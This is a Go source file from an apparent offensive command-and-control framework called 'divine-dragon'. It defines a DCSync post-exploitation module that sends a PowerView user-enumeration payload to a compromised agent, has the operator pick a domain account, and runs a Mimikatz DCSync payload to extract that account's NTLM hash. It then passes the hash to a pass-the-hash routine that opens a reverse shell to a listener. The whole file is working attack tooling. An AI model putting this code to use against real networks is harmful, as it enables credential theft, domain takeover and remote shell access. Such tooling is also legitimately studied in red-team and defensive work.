package local_post

import (
	"bufio"
	"divine-dragon/c2"
	"divine-dragon/local_exploit"
	"divine-dragon/payload_generator"
	"divine-dragon/util"
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"time"
)

type DCSyncModule struct {
	c2m        *c2.C2Module
	agentUuid  string
	listenHost string
	listenPort string

	logger util.Logger
}

func NewDCSyncModule(c2mOpt *c2.C2Module, agentUuidOpt, listenHostOpt, listenPortOpt string) *DCSyncModule {
	dsm := DCSyncModule{
		c2m:        c2mOpt,
		agentUuid:  agentUuidOpt,
		listenHost: listenHostOpt,
		listenPort: listenPortOpt,
	}
	dsm.logger = util.DCSyncLogger(true, "")
	return &dsm
}

func (dsm *DCSyncModule) Run() {
	stpgm := payload_generator.NewStageTwoPayloadGeneratorModule(dsm.c2m.GetC2Hostname(), dsm.c2m.GetC2Port(), "powerview_enumusers", "windows", "amd64", "powerview_enumusers.exe")
	stpgm.Run()

	jobUuid, err := dsm.c2m.AddJob(dsm.agentUuid, "powerview_enumusers.exe")
	if err != nil {
		dsm.logger.Log.Error(err)
		return
	}
	dsm.logger.Log.Info("Waiting for an agent to execute a job...")
	var jobs []string
	var statuses map[string]bool
	var results map[string]string
	jobNotFound := true
	for jobNotFound {
		jobs, statuses, results = dsm.c2m.GetAllAgentJobs(dsm.agentUuid)
		for _, job := range jobs {
			if jobUuid == job && len(results[jobUuid]) > 0 {
				jobNotFound = false
			}
		}
		// pttm.logger.Log.Info("Sleeping for 3 sec...")
		time.Sleep(time.Second * 1)
	}
	if !statuses[jobUuid] {
		dsm.logger.Log.Info("Job wasn't executed as planned. Stopping...")
		return
	} else {
		dsm.logger.Log.Noticef("Job executed fine. Parsing the results...")
		if strings.Compare(results[jobUuid], "Job hasn't returned some output. But it seems ok.") == 0 {
			dsm.logger.Log.Info("Job executed fine, but it has no results. Stopping...")
			return
		} else {
			if strings.Contains(results[jobUuid], "Found users") {
				dsm.logger.Log.Info("Module found some users...")
			}
			if strings.Contains(results[jobUuid], "Found domain") {
				dsm.logger.Log.Info("Module found a domain...")
			}
			startOfJsonInd := strings.Index(results[jobUuid], "Result in JSON:")
			jsonOutput := results[jobUuid][startOfJsonInd+len("Result in JSON:")+2:]
			var output payloadOutput
			err := json.Unmarshal([]byte(jsonOutput), &output)
			if err != nil {
				dsm.logger.Log.Error("Something wrong with the payload output. Exiting...")
				return
			}
			dsm.printResults(output)
			fmt.Println("Type a username to execute Pass The Hash attack in format DOMAIN\\USERNAME:")
			fmt.Println()
			scanner := bufio.NewScanner(os.Stdin)
			var selected string
			for scanner.Scan() {
				username := scanner.Text()
				formattedUsername := util.FormatCommand(username)
				if strings.Compare(formattedUsername, "quit") == 0 || strings.Compare(formattedUsername, "exit") == 0 {
					return
				} else {
					foundUsername := false
					for _, user := range output.Users {
						if formattedUsername == user {
							foundUsername = true
						}
					}
					if foundUsername {
						selected = formattedUsername
						break
					} else {
						dsm.logger.Log.Error("Your input incorrect. Try again.\n")
					}
				}
			}
			dsm.runDCSyncAndReverseShell(selected, output.Domain.Forest.Name)
		}
	}
}

type payloadOutput struct {
	Domain struct {
		Forest struct {
			Name                  string `json:"Name"`
			Sites                 string `json:"Sites"`
			Domains               string `json:"Domains"`
			GlobalCatalogs        string `json:"GlobalCatalogs"`
			ApplicationPartitions string `json:"ApplicationPartitions"`
			ForestModeLevel       int    `json:"ForestModeLevel"`
			ForestMode            int    `json:"ForestMode"`
			RootDomain            string `json:"RootDomain"`
			Schema                string `json:"Schema"`
			SchemaRoleOwner       string `json:"SchemaRoleOwner"`
			NamingRoleOwner       string `json:"NamingRoleOwner"`
		} `json:"Forest"`
	} `json:"Domain"`
	Users []string `json:"Users"`
}

func (dsm *DCSyncModule) printResults(output payloadOutput) {
	dsm.logger.Log.Info("Current domain:")
	fmt.Println()
	fmt.Printf("\t%s\n", output.Domain.Forest.Name)
	fmt.Println()
	dsm.logger.Log.Info("Users:")
	fmt.Println()
	for _, user := range output.Users {
		fmt.Printf("\t%s\n", user)
	}
	fmt.Printf("\n")
}

func (dsm *DCSyncModule) runDCSyncAndReverseShell(selected, domain string) {
	stpgm := payload_generator.NewStageTwoPayloadGeneratorModule(dsm.c2m.GetC2Hostname(), dsm.c2m.GetC2Port(), "mimikatz_dcsync", "windows", "amd64", "mimikatz_dcsync.exe")
	splittedDomain := strings.Split(domain, ".")
	formattedDomain := splittedDomain[0]
	stpgm.SetDCSyncParams(selected, formattedDomain)
	stpgm.Run()

	jobUuid, err := dsm.c2m.AddJob(dsm.agentUuid, "mimikatz_dcsync.exe")
	if err != nil {
		dsm.logger.Log.Error(err)
		return
	}
	dsm.logger.Log.Info("Waiting for an agent to execute a job...")
	var jobs []string
	var statuses map[string]bool
	var results map[string]string
	jobNotFound := true
	for jobNotFound {
		jobs, statuses, results = dsm.c2m.GetAllAgentJobs(dsm.agentUuid)
		for _, job := range jobs {
			if jobUuid == job && len(results[jobUuid]) > 0 {
				jobNotFound = false
			}
		}
		// pttm.logger.Log.Info("Sleeping for 3 sec...")
		time.Sleep(time.Second * 1)
	}
	if !statuses[jobUuid] {
		dsm.logger.Log.Info("Job wasn't executed as planned. Stopping...")
		return
	} else {
		dsm.logger.Log.Noticef("Job executed fine. Parsing the results...")
		if strings.Compare(results[jobUuid], "Job hasn't returned some output. But it seems ok.") == 0 {
			dsm.logger.Log.Info("Job executed fine, but it has no results. Stopping...")
			return
		} else {
			hashNtlmStrInd := strings.Index(results[jobUuid], "Hash NTLM: ")
			if hashNtlmStrInd != -1 {
				ntlmBeginInd := hashNtlmStrInd + len("Hash NTLM: ")
				ntlmEndInd := ntlmBeginInd + 32
				hash := results[jobUuid][ntlmBeginInd:ntlmEndInd]
				dsm.logger.Log.Infof("DCSync was successfull. Using NTLM hash %s to supply you a reverse shell.", hash)
				pthm := local_exploit.NewPassTheHashModule(dsm.c2m, dsm.agentUuid, dsm.listenHost, dsm.listenPort)
				pthm.RunPthWithReverseShell(selected, domain, hash)
			} else {
				dsm.logger.Log.Error("NTLM hash wasn't aquired. Exiting...")
			}
		}
	}
}
